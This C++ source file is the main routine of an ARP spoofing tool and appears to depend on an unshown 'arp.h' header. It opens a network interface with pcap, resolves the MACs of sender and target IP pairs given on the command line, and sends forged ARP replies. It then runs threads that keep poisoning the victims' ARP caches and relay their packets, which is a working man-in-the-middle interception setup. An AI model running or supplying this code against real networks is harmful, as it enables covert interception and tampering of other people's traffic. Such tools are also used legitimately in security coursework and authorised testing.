#include "arp.h"

using namespace std;

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    Mac attacker_mac = get_my_mac(dev);
    printf("Attacker MAC : %s\n", string(attacker_mac).c_str());

    Ip target_ip = get_target_ip(dev);
    printf("Attacker target IP: %s\n", string(target_ip).c_str());

    for (int i = 2; i < argc; i += 2) {
        Flow flow;
        flow.sender_ip = Ip(argv[i]);
        flow.target_ip = Ip(argv[i+1]);
        flow.sender_mac = get_sender_mac(handle, flow.sender_ip, attacker_mac, Ip(dev));
        flow.target_mac = get_sender_mac(handle, flow.target_ip, attacker_mac, Ip(dev));

        if (flow.sender_mac == Mac::nullMac() || flow.target_mac == Mac::nullMac()) {
            fprintf(stderr, "Failed to get MAC address for %s or %s\n", string(flow.sender_ip).c_str(), string(flow.target_ip).c_str());
            continue;
        }

        flows.push_back(flow);
        printf("<<<<<<<<<<Flow>>>>>>>>>>\n");
        printf("Sender IP: %s, MAC: %s \nTarget IP: %s, MAC: %s\n",
               string(flow.sender_ip).c_str(), string(flow.sender_mac).c_str(),
               string(flow.target_ip).c_str(), string(flow.target_mac).c_str());

        send_arp_spoof(handle, flow, attacker_mac);
    }

    thread spoof_thread(arp_spoof, handle, attacker_mac);
    thread packet_thread(packet_handler, handle, attacker_mac);

    printf("ARP spoofing and packet relaying started. Press Enter to stop...\n");
    getchar();

    should_stop = true;
    spoof_thread.join();
    packet_thread.join();

    pcap_close(handle);
    return 0;
}
